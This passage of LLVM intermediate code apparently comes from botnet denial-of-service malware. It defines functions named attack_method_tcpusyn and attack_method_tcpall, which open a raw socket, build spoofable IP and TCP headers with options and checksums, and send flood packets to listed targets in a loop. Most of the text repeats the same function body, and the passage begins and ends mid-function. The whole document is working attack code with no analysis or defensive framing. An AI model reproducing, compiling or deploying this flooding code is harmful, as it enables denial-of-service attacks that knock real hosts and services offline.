  store i16 %106, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %46) #11
  %110 = zext i16 %109 to i32
  %111 = getelementptr inbounds i8, i8* %80, i64 24
  %112 = bitcast i8* %111 to i32*
  store i32 %110, i32* %112, align 4
  %113 = getelementptr inbounds i8, i8* %80, i64 32
  %114 = bitcast i8* %113 to i16*
  store i16 %65, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %80, i64 41
  store i8 2, i8* %83, align 1
  %116 = getelementptr inbounds i8, i8* %80, i64 42
  store i8 4, i8* %115, align 1
  %117 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %118 = bitcast i8* %116 to i16*
  store i16 %117, i16* %118, align 2
  %119 = getelementptr inbounds i8, i8* %80, i64 44
  %120 = getelementptr inbounds i8, i8* %80, i64 45
  store i8 4, i8* %119, align 1
  %121 = getelementptr inbounds i8, i8* %80, i64 46
  store i8 2, i8* %120, align 1
  %122 = getelementptr inbounds i8, i8* %80, i64 47
  store i8 8, i8* %121, align 1
  store i8 10, i8* %122, align 1
  %123 = getelementptr inbounds i8, i8* %80, i64 56
  %124 = getelementptr inbounds i8, i8* %80, i64 57
  store i8 1, i8* %123, align 1
  %125 = getelementptr inbounds i8, i8* %80, i64 58
  store i8 3, i8* %124, align 1
  %126 = getelementptr inbounds i8, i8* %80, i64 59
  store i8 3, i8* %125, align 1
  store i8 6, i8* %126, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %127 = icmp slt i64 %indvars.iv.next, %64
  br i1 %127, label %79, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %171
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %171
  %128 = phi i32 [ %188, %171 ], [ 0, %.lr.ph.preheader ]
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %8, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  %133 = getelementptr inbounds i8, i8* %131, i64 20
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = icmp ult i8 %135, 32
  br i1 %136, label %137, label %144

; <label>:137:                                    ; preds = %.lr.ph
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #11
  %141 = call i32 @htonl(i32 %140) #11
  %142 = getelementptr inbounds i8, i8* %131, i64 16
  %143 = bitcast i8* %142 to i32*
  store i32 %141, i32* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %137, %.lr.ph
  br i1 %69, label %145, label %148

; <label>:145:                                    ; preds = %144
  %146 = getelementptr inbounds i8, i8* %131, i64 12
  %147 = bitcast i8* %146 to i32*
  store i32 0, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %144
  br i1 %71, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %131, i64 4
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %73, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %133 to i16*
  store i16 0, i16* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %153, %152
  br i1 %75, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %131, i64 22
  %158 = bitcast i8* %157 to i16*
  store i16 0, i16* %158, align 2
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %76, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %131, i64 24
  %162 = bitcast i8* %161 to i32*
  store i32 0, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %77, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %131, i64 28
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %78, label %171, label %168

; <label>:168:                                    ; preds = %167
  %169 = getelementptr inbounds i8, i8* %131, i64 38
  %170 = bitcast i8* %169 to i16*
  store i16 0, i16* %170, align 2
  br label %171

; <label>:171:                                    ; preds = %167, %168
  %172 = getelementptr inbounds i8, i8* %131, i64 10
  %173 = bitcast i8* %172 to i16*
  store i16 0, i16* %173, align 2
  %174 = bitcast i8* %131 to i16*
  %175 = call zeroext i16 @checksum_generic(i16* %174, i32 20)
  store i16 %175, i16* %173, align 2
  %176 = getelementptr inbounds i8, i8* %131, i64 36
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 4
  %178 = call zeroext i16 @htons(i16 zeroext 40) #11
  %179 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %132, i8* %133, i16 zeroext %178, i32 40)
  store i16 %179, i16* %177, align 4
  %180 = getelementptr inbounds i8, i8* %131, i64 22
  %181 = bitcast i8* %180 to i16*
  %182 = load i16, i16* %181, align 2
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0, i32 1
  store i16 %182, i16* %183, align 2
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0
  %185 = bitcast %struct.sockaddr_in* %184 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %37, i8* %131, i64 60, i32 16384, %struct.sockaddr* %185, i32 16) #10
  %187 = load i32, i32* %5, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %5, align 4
  %189 = icmp slt i32 %188, %43
  br i1 %189, label %.lr.ph, label %.loopexit.loopexit

; <label>:190:                                    ; preds = %4, %66
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpusyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %190, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %66, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = zext i8 %0 to i64
  %65 = or i16 %63, 160
  br label %79

; <label>:66:                                     ; preds = %39
  %67 = call i32 @close(i32 %37) #10
  br label %190

..preheader_crit_edge:                            ; preds = %96
  %68 = trunc i64 %indvars.iv.next to i32
  store i32 %68, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %69 = icmp eq i32 %36, -1
  %70 = and i32 %11, 65535
  %71 = icmp eq i32 %70, 65535
  %72 = and i32 %17, 65535
  %73 = icmp eq i32 %72, 65535
  %74 = and i32 %19, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = icmp eq i32 %21, 65535
  %77 = icmp eq i32 %22, 65535
  %78 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:79:                                     ; preds = %.lr.ph130, %96
  %indvars.iv = phi i64 [ 0, %.lr.ph130 ], [ %indvars.iv.next, %96 ]
  %80 = call noalias i8* @calloc(i64 128, i64 1) #10
  %81 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %80, i8** %81, align 8
  %82 = getelementptr inbounds i8, i8* %80, i64 20
  %83 = getelementptr inbounds i8, i8* %80, i64 40
  store i8 69, i8* %80, align 4
  %84 = getelementptr inbounds i8, i8* %80, i64 1
  store i8 %10, i8* %84, align 1
  %85 = call zeroext i16 @htons(i16 zeroext 60) #11
  %86 = getelementptr inbounds i8, i8* %80, i64 2
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %12) #11
  %89 = getelementptr inbounds i8, i8* %80, i64 4
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 4
  %91 = getelementptr inbounds i8, i8* %80, i64 8
  store i8 %14, i8* %91, align 4
  br i1 %45, label %96, label %92

; <label>:92:                                     ; preds = %79
  %93 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %94 = getelementptr inbounds i8, i8* %80, i64 6
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  br label %96

; <label>:96:                                     ; preds = %79, %92
  %97 = getelementptr inbounds i8, i8* %80, i64 9
  store i8 6, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %80, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %36, i32* %99, align 4
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = getelementptr inbounds i8, i8* %80, i64 16
  %103 = bitcast i8* %102 to i32*
  store i32 %101, i32* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %18) #11
  %105 = bitcast i8* %82 to i16*
  store i16 %104, i16* %105, align 4
  %106 = call zeroext i16 @htons(i16 zeroext %20) #11
  %107 = getelementptr inbounds i8, i8* %80, i64 22
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %46) #11
  %110 = zext i16 %109 to i32
  %111 = getelementptr inbounds i8, i8* %80, i64 24
  %112 = bitcast i8* %111 to i32*
  store i32 %110, i32* %112, align 4
  %113 = getelementptr inbounds i8, i8* %80, i64 32
  %114 = bitcast i8* %113 to i16*
  store i16 %65, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %80, i64 41
  store i8 2, i8* %83, align 1
  %116 = getelementptr inbounds i8, i8* %80, i64 42
  store i8 4, i8* %115, align 1
  %117 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %118 = bitcast i8* %116 to i16*
  store i16 %117, i16* %118, align 2
  %119 = getelementptr inbounds i8, i8* %80, i64 44
  %120 = getelementptr inbounds i8, i8* %80, i64 45
  store i8 4, i8* %119, align 1
  %121 = getelementptr inbounds i8, i8* %80, i64 46
  store i8 2, i8* %120, align 1
  %122 = getelementptr inbounds i8, i8* %80, i64 47
  store i8 8, i8* %121, align 1
  store i8 10, i8* %122, align 1
  %123 = getelementptr inbounds i8, i8* %80, i64 56
  %124 = getelementptr inbounds i8, i8* %80, i64 57
  store i8 1, i8* %123, align 1
  %125 = getelementptr inbounds i8, i8* %80, i64 58
  store i8 3, i8* %124, align 1
  %126 = getelementptr inbounds i8, i8* %80, i64 59
  store i8 3, i8* %125, align 1
  store i8 6, i8* %126, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %127 = icmp slt i64 %indvars.iv.next, %64
  br i1 %127, label %79, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %171
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %171
  %128 = phi i32 [ %188, %171 ], [ 0, %.lr.ph.preheader ]
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %8, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  %133 = getelementptr inbounds i8, i8* %131, i64 20
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = icmp ult i8 %135, 32
  br i1 %136, label %137, label %144

; <label>:137:                                    ; preds = %.lr.ph
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #11
  %141 = call i32 @htonl(i32 %140) #11
  %142 = getelementptr inbounds i8, i8* %131, i64 16
  %143 = bitcast i8* %142 to i32*
  store i32 %141, i32* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %137, %.lr.ph
  br i1 %69, label %145, label %148

; <label>:145:                                    ; preds = %144
  %146 = getelementptr inbounds i8, i8* %131, i64 12
  %147 = bitcast i8* %146 to i32*
  store i32 0, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %144
  br i1 %71, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %131, i64 4
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %73, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %133 to i16*
  store i16 0, i16* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %153, %152
  br i1 %75, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %131, i64 22
  %158 = bitcast i8* %157 to i16*
  store i16 0, i16* %158, align 2
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %76, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %131, i64 24
  %162 = bitcast i8* %161 to i32*
  store i32 0, i32* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %77, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %131, i64 28
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %78, label %171, label %168

; <label>:168:                                    ; preds = %167
  %169 = getelementptr inbounds i8, i8* %131, i64 38
  %170 = bitcast i8* %169 to i16*
  store i16 0, i16* %170, align 2
  br label %171

; <label>:171:                                    ; preds = %167, %168
  %172 = getelementptr inbounds i8, i8* %131, i64 10
  %173 = bitcast i8* %172 to i16*
  store i16 0, i16* %173, align 2
  %174 = bitcast i8* %131 to i16*
  %175 = call zeroext i16 @checksum_generic(i16* %174, i32 20)
  store i16 %175, i16* %173, align 2
  %176 = getelementptr inbounds i8, i8* %131, i64 36
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 4
  %178 = call zeroext i16 @htons(i16 zeroext 40) #11
  %179 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %132, i8* %133, i16 zeroext %178, i32 40)
  store i16 %179, i16* %177, align 4
  %180 = getelementptr inbounds i8, i8* %131, i64 22
  %181 = bitcast i8* %180 to i16*
  %182 = load i16, i16* %181, align 2
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0, i32 1
  store i16 %182, i16* %183, align 2
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 0
  %185 = bitcast %struct.sockaddr_in* %184 to %struct.sockaddr*
  %186 = call i64 @sendto(i32 %37, i8* %131, i64 60, i32 16384, %struct.sockaddr* %185, i32 16) #10
  %187 = load i32, i32* %5, align 4
  %188 = add nsw i32 %187, 1
  store i32 %188, i32* %5, align 4
  %189 = icmp slt i32 %188, %43
  br i1 %189, label %.lr.ph, label %.loopexit.loopexit

; <label>:190:                                    ; preds = %4, %66
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpall(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 1)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 1)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 1)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 1)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %190, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %66, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %64 = zext i8 %0 to i64
  %65 = or i16 %63, 160
  br label %79

; <label>:66:                                     ; preds = %39
  %67 = call i32 @close(i32 %37) #10
  br label %190

..preheader_crit_edge:                            ; preds = %96
  %68 = trunc i64 %indvars.iv.next to i32
  store i32 %68, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %69 = icmp eq i32 %36, -1
  %70 = and i32 %11, 65535
  %71 = icmp eq i32 %70, 65535
  %72 = and i32 %17, 65535
  %73 = icmp eq i32 %72, 65535
  %74 = and i32 %19, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = icmp eq i32 %21, 65535
  %77 = icmp eq i32 %22, 65535
  %78 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:79:                                     ; preds = %.lr.ph130, %96
  %indvars.iv = phi i64 [ 0, %.lr.ph130 ], [ %indvars.iv.next, %96 ]
  %80 = call noalias i8* @calloc(i64 128, i64 1) #10
  %81 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %80, i8** %81, align 8
  %82 = getelementptr inbounds i8, i8* %80, i64 20
  %83 = getelementptr inbounds i8, i8* %80, i64 40
  store i8 69, i8* %80, align 4
  %84 = getelementptr inbounds i8, i8* %80, i64 1
  store i8 %10, i8* %84, align 1
  %85 = call zeroext i16 @htons(i16 zeroext 60) #11
  %86 = getelementptr inbounds i8, i8* %80, i64 2
  %87 = bitcast i8* %86 to i16*
  store i16 %85, i16* %87, align 2
  %88 = call zeroext i16 @htons(i16 zeroext %12) #11
  %89 = getelementptr inbounds i8, i8* %80, i64 4
  %90 = bitcast i8* %89 to i16*
  store i16 %88, i16* %90, align 4
  %91 = getelementptr inbounds i8, i8* %80, i64 8
  store i8 %14, i8* %91, align 4
  br i1 %45, label %96, label %92

; <label>:92:                                     ; preds = %79
  %93 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %94 = getelementptr inbounds i8, i8* %80, i64 6
  %95 = bitcast i8* %94 to i16*
  store i16 %93, i16* %95, align 2
  br label %96

; <label>:96:                                     ; preds = %79, %92
  %97 = getelementptr inbounds i8, i8* %80, i64 9
  store i8 6, i8* %97, align 1
  %98 = getelementptr inbounds i8, i8* %80, i64 12
  %99 = bitcast i8* %98 to i32*
  store i32 %36, i32* %99, align 4
  %100 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %101 = load i32, i32* %100, align 4
  %102 = getelementptr inbounds i8, i8* %80, i64 16
  %103 = bitcast i8* %102 to i32*
  store i32 %101, i32* %103, align 4
  %104 = call zeroext i16 @htons(i16 zeroext %18) #11
  %105 = bitcast i8* %82 to i16*
  store i16 %104, i16* %105, align 4
  %106 = call zeroext i16 @htons(i16 zeroext %20) #11
  %107 = getelementptr inbounds i8, i8* %80, i64 22
  %108 = bitcast i8* %107 to i16*
  store i16 %106, i16* %108, align 2
  %109 = call zeroext i16 @htons(i16 zeroext %46) #11
  %110 = zext i16 %109 to i32
  %111 = getelementptr inbounds i8, i8* %80, i64 24
  %112 = bitcast i8* %111 to i32*
  store i32 %110, i32* %112, align 4
  %113 = getelementptr inbounds i8, i8* %80, i64 32
  %114 = bitcast i8* %113 to i16*
  store i16 %65, i16* %114, align 4
  %115 = getelementptr inbounds i8, i8* %80, i64 41
  store i8 2, i8* %83, align 1
  %116 = getelementptr inbounds i8, i8* %80, i64 42
  store i8 4, i8* %115, align 1
  %117 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %118 = bitcast i8* %116 to i16*
  store i16 %117, i16* %118, align 2
  %119 = getelementptr inbounds i8, i8* %80, i64 44
  %120 = getelementptr inbounds i8, i8* %80, i64 45
  store i8 4, i8* %119, align 1
  %121 = getelementptr inbounds i8, i8* %80, i64 46
  store i8 2, i8* %120, align 1
  %122 = getelementptr inbounds i8, i8* %80, i64 47
  store i8 8, i8* %121, align 1
  store i8 10, i8* %122, align 1
  %123 = getelementptr inbounds i8, i8* %80, i64 56
  %124 = getelementptr inbounds i8, i8* %80, i64 57
  store i8 1, i8* %123, align 1
  %125 = getelementptr inbounds i8, i8* %80, i64 58
  store i8 3, i8* %124, align 1
  %126 = getelementptr inbounds i8, i8* %80, i64 59
  store i8 3, i8* %125, align 1
  store i8 6, i8* %126, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %127 = icmp slt i64 %indvars.iv.next, %64
  br i1 %127, label %79, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %171
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %44, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %171
  %128 = phi i32 [ %188, %171 ], [ 0, %.lr.ph.preheader ]
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %8, i64 %129
  %131 = load i8*, i8** %130, align 8
  %132 = bitcast i8* %131 to %struct.iphdr*
  %133 = getelementptr inbounds i8, i8* %131, i64 20
  %134 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 2
  %135 = load i8, i8* %134, align 4
  %136 = icmp ult i8 %135, 32
  br i1 %136, label %137, label %144

; <label>:137:                                    ; preds = %.lr.ph
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %129, i32 1
  %139 = load i32, i32* %138, align 4
  %140 = call i32 @ntohl(i32 %139) #11
  %141 = call i32 @htonl(i32 %140) #11
  %142 = getelementptr inbounds i8, i8* %131, i64 16
  %143 = bitcast i8* %142 to i32*
  store i32 %141, i32* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %137, %.lr.ph
  br i1 %69, label %145, label %148

; <label>:145:                                    ; preds = %144
  %146 = getelementptr inbounds i8, i8* %131, i64 12
  %147 = bitcast i8* %146 to i32*
  store i32 0, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %145, %144
  br i1 %71, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %131, i64 4
  %151 = bitcast i8* %150 to i16*
  store i16 0, i16* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %73, label %153, label %155

; <label>:153:                                    ; preds = %152
  %154 = bitcast i8* %133 to i16*
  store i16 0, i16* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %153, %152
  br i1 %75, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %131, i64 22
  %158 = bitcast i8* %157 to i16*
  store i16 0, i16* %158, align 2
  br label %159

